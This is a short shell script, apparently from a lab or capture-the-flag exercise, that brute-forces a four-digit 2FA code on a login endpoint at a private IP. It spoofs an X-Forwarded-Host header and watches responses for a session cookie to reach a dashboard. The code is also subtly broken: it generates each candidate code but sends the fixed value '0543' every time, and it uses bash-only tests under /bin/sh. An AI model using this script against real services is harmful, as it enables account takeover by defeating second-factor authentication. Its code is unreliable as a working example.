#!/bin/sh

bandera="0"

for i in $(seq 0 9)
do
	for j in $(seq 0 9)
	do
		for k in $(seq 0 9)
		do
			for l in $(seq 0 9)
			do
				var="$i$j$k$l"
				contenido=$(curl -s "http://192.168.86.49:1337/auth/verify-2fa" -H "X-Forwarded-Host: 127.0.0.1:1337" -X POST -d "2fa-code=0543" -v 2>&1 | grep "session")
				
				if [[ -n "$contenido" ]]
				then
					echo "[+] Sucessful: $contenido follow /dashboard with cookie"
					bandera="1"
				fi
				if [[ "$bandera" -eq "1"  ]]
				then
					break
				fi

			done
			if [[ "$bandera" -eq "1"  ]]
                        then
                        	break
                        fi
		done
		if [[ "$bandera" -eq "1"  ]]
                then
                	break
                fi
	done
	if [[ "$bandera" -eq "1"  ]]
        then
		break
        fi
done
